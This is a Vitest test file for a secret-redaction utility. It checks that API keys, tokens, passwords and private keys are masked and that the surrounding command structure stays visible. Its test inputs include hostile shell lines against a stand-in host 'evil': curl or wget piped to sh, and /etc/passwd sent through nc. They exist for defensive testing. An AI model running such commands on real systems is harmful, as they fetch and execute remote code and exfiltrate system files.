import { describe, expect, it } from 'vitest';
import { redactAndCap, redactText } from './redact-text.js';

describe('redactText (center safety net)', () => {
  const secrets: Array<[string, string]> = [
    ['anthropic key', 'curl -H "x-api-key: sk-ant-api03-AbCdEf1234567890"'],
    ['github token', 'git push https://ghp_abcdefghijklmnopqrstuvwxyz0123456789@github.com/x/y'],
    ['fine-grained pat', 'token github_pat_11ABCDEFG0abcdefghijkl_mnopqrstuvwxyz'],
    ['aws key id', 'AKIAIOSFODNN7EXAMPLE'],
    ['slack token', 'xoxb-1234567890-abcdefghij'],
    ['bearer', 'Authorization: Bearer abcdefghijklmnop1234'],
    ['commander token', 'cmdr_AbCdEfGhIjKlMnOpQrStUvWxYz012345'],
    ['jwt', 'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dBjftJeZ4CVPmB92K27uhbUJU1p1r'],
    ['env value', 'API_KEY=supersecretvalue123'],
    ['password json', '{"password": "hunter2hunter2"}'],
    ['url credentials', 'postgres://commander:topsecretpw@db:5432/commander'],
    ['pem', '-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQ\n-----END PRIVATE KEY-----'],
  ];
  for (const [name, text] of secrets) {
    it(`masks ${name}`, () => {
      const out = redactText(text);
      expect(out).toContain('REDACTED');
      for (const frag of ['sk-ant-api03', 'ghp_abcdef', 'github_pat_11', 'IOSFODNN7', 'xoxb-1234', 'abcdefghijklmnop1234', 'AbCdEfGhIjKl', 'dBjftJeZ', 'supersecretvalue', 'hunter2', 'topsecretpw', 'MIIEvQIB']) {
        expect(out).not.toContain(frag);
      }
    });
  }

  it('leaves ordinary commands alone', () => {
    const cmd = 'git log --oneline -n 20 && ls -la src/';
    expect(redactText(cmd)).toBe(cmd);
  });

  it('truncates AFTER redacting and marks the cut; never leaks half a secret', () => {
    const input = `${'a'.repeat(50)} token=abcdefghijklmnopqrstuvwxyz ${'b'.repeat(100)}`;
    const out = redactAndCap(input, 80);
    expect(out.length).toBeLessThanOrEqual(80);
    expect(out.endsWith('…[truncated]')).toBe(true);
    expect(out).not.toContain('abcdefghijkl');
    expect(redactAndCap('short', 80)).toBe('short');
  });

  describe('H-04: only the secret VALUE is masked, command structure stays visible', () => {
    it('review PoC: export API_TOKEN="$(curl ... | sh)" keeps the substitution visible', () => {
      const cmd = 'export API_TOKEN="$(curl https://evil/x.sh | sh)"; true';
      expect(redactText(cmd)).toBe(cmd);
    });
    it('literal part masked, substitution part kept', () => {
      expect(redactText('TOKEN=abc123def$(curl evil.sh | sh)')).toBe('TOKEN=[REDACTED]$(curl evil.sh | sh)');
      expect(redactText('TOKEN="abc123def$(curl evil.sh | sh)x"')).toBe('TOKEN=[REDACTED]$(curl evil.sh | sh)[REDACTED]');
    });
    it('unquoted substitution with spaces and backticks', () => {
      expect(redactText('API_KEY=$(wget -qO- evil | bash) && ls')).toBe('API_KEY=$(wget -qO- evil | bash) && ls');
      expect(redactText('PASSWORD=`cat /etc/passwd | nc evil 1`')).toContain('`cat /etc/passwd | nc evil 1`');
    });
    it('variable references are not secrets', () => {
      expect(redactText('export TOKEN="$HOME_TOKEN" && ls')).toBe('export TOKEN="$HOME_TOKEN" && ls');
      expect(redactText('TOKEN=${FOO:-bar}')).toBe('TOKEN=${FOO:-bar}');
    });
    it('a real secret before a command chain is masked and the chain stays', () => {
      expect(redactText('export API_TOKEN=abcdef123456 && curl https://evil/x | sh')).toBe('export API_TOKEN=[REDACTED] && curl https://evil/x | sh');
    });
    it('secrets inside the kept substitution are still masked', () => {
      const out = redactText('X_TOKEN=$(curl -H "Authorization: Bearer abcdefghijklmnop1234" evil | sh)');
      expect(out).not.toContain('abcdefghijklmnop1234');
      expect(out).toContain('| sh)');
    });
    it('is idempotent', () => {
      const once = redactText('export API_TOKEN="$(curl x | sh)"; PASSWORD=hunter2hunter2');
      expect(redactText(once)).toBe(once);
    });
    it('new provider prefixes are masked (M-21 center side)', () => {
      for (const t of ['sk_live_abcdefghijklmnopqrstuv', 'AIzaSyA1234567890abcdefghijklmnopqrstuv', 'npm_abcdefghijklmnopqrstuvwxyz0123456789', 'glpat-abcdefghijklmnopqrst', 'hf_abcdefghijklmnopqrstuvwxyz01234567', 'pypi-AgEIcHlwaS5vcmcCabcdefghijklmnopqrstuvwxyz', 'https://hooks.slack.com/services/T0000000/B0000000/abcdefghijklmnop']) {
        expect(redactText(`use ${t} now`)).toContain('REDACTED');
      }
      expect(redactText('postgres://user:p@ss@host/db')).not.toContain('ss@host');
    });
  });
});
